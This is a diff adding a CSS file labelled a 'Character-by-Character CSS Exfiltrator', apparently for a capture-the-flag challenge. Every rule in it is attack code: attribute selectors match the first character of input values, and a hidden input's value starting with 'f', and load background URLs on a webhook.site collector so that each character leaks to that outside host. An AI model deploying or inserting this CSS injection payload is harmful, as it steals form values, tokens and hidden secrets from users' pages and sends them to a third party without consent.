@@ -1,0 +1,51 @@
+/* Character-by-Character CSS Exfiltrator */
+/* Webhook: https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497 */
+
+/* Extract first character of input values */
+input[value^="a" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=a); }
+input[value^="b" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=b); }
+input[value^="c" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=c); }
+input[value^="d" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=d); }
+input[value^="e" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=e); }
+input[value^="f" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=f); }
+input[value^="g" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=g); }
+input[value^="h" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=h); }
+input[value^="i" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=i); }
+input[value^="j" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=j); }
+input[value^="k" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=k); }
+input[value^="l" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=l); }
+input[value^="m" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=m); }
+input[value^="n" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=n); }
+input[value^="o" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=o); }
+input[value^="p" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=p); }
+input[value^="q" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=q); }
+input[value^="r" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=r); }
+input[value^="s" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=s); }
+input[value^="t" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=t); }
+input[value^="u" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=u); }
+input[value^="v" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=v); }
+input[value^="w" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=w); }
+input[value^="x" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=x); }
+input[value^="y" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=y); }
+input[value^="z" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=z); }
+input[value^="0" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=0); }
+input[value^="1" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=1); }
+input[value^="2" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=2); }
+input[value^="3" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=3); }
+input[value^="4" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=4); }
+input[value^="5" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=5); }
+input[value^="6" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=6); }
+input[value^="7" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=7); }
+input[value^="8" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=8); }
+input[value^="9" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=9); }
+input[value^="{" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=openbrace); }
+input[value^="}" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=closebrace); }
+input[value^="_" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=underscore); }
+input[value^="-" i] { --char1: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/char?pos=1&char=dash); }
+
+/* Apply the variable to trigger requests */
+input { background: var(--char1, none); }
+
+/* Extract hidden input values too */
+input[type="hidden"][value^="f" i] { --hidden-flag: url(https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497/hidden?starts=f); }
+html { background: var(--hidden-flag, none); }
